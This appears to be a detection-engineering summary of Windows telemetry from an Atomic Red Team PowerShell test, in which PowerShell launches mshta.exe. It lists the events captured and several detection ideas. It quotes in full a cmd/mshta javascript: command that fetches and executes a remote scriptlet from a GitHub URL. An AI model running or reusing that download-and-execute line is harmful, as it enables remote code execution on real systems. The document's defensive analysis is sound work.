# T1059.001-8: PowerShell — Powershell invoke mshta.exe download

## Technique Context

T1059.001 covers PowerShell execution as a command and scripting interpreter. This specific test demonstrates PowerShell invoking mshta.exe with a JavaScript payload that attempts to download and execute remote content. The technique combines PowerShell's process spawning capabilities with mshta.exe's ability to execute JavaScript and VBScript code, making it a common vector for initial access and execution evasion. Detection engineers typically focus on command-line patterns showing mshta.exe with suspicious arguments (javascript:, vbscript:, http/https URLs), process relationships where PowerShell spawns mshta.exe, and network connections from mshta.exe to external domains.

## What This Dataset Contains

The dataset captures PowerShell attempting to execute a command that spawns cmd.exe, which then tries to launch mshta.exe with a JavaScript payload. The key evidence includes:

**Security Event 4688** shows the malicious command line: `"cmd.exe" /c C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"` with creator process powershell.exe (PID 22332).

**Security Event 4689** reveals cmd.exe (PID 24740) exited with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution.

**Sysmon Event 1** captures whoami.exe execution from PowerShell, showing normal system enumeration activity.

**Sysmon Event 8** shows CreateRemoteThread activity from PowerShell (PID 22332) to an unknown target process (PID 24740), suggesting injection attempts.

**Sysmon Event 10** captures process access from PowerShell to whoami.exe with full access rights (0x1FFFFF).

**PowerShell Events 4103/4104** contain only test framework boilerplate (Set-ExecutionPolicy Bypass commands and error handling scriptblocks) with no malicious PowerShell script content captured.

## What This Dataset Does Not Contain

The dataset lacks the actual mshta.exe process creation because Windows Defender blocked the execution at the cmd.exe level with STATUS_ACCESS_DENIED. Consequently, there are no Sysmon events showing mshta.exe starting, no network connections to raw.githubusercontent.com, no DNS queries for the external domain, and no file downloads or script component object model (SCT) file execution. The PowerShell channel doesn't contain the actual Invoke-Expression or similar commands that would have triggered the mshta.exe execution, only showing the test framework setup commands.

## Assessment

This dataset provides excellent telemetry for detecting the initial stages of PowerShell-based mshta.exe attacks, particularly the command-line patterns and process relationships. The Security 4688 event with the full command line containing the javascript: payload and external URL is high-fidelity detection material. However, the dataset's value is somewhat limited by Defender's blocking action, which prevents observation of the complete attack chain including network activity and payload execution. For detection engineering focused on prevention and early-stage indicators, this data is highly valuable, but it won't help with understanding post-execution behaviors.

## Detection Opportunities Present in This Data

1. **Command line detection** - Security 4688 events showing cmd.exe or mshta.exe with javascript: or vbscript: arguments, especially containing external URLs
2. **Process chain analysis** - powershell.exe spawning cmd.exe spawning mshta.exe with suspicious arguments
3. **mshta.exe network indicators** - any mshta.exe process making external network connections (though blocked in this case)
4. **PowerShell process injection** - Sysmon Event 8 CreateRemoteThread from PowerShell to unknown processes
5. **Access denied correlation** - Security 4689 events with exit code 0xC0000022 following suspicious command executions
6. **mshta.exe execution from scripting engines** - any mshta.exe launched by PowerShell, cmd.exe, or wscript.exe
7. **URL pattern matching** - command lines containing githubusercontent.com, pastebin.com, or other common staging domains combined with mshta.exe
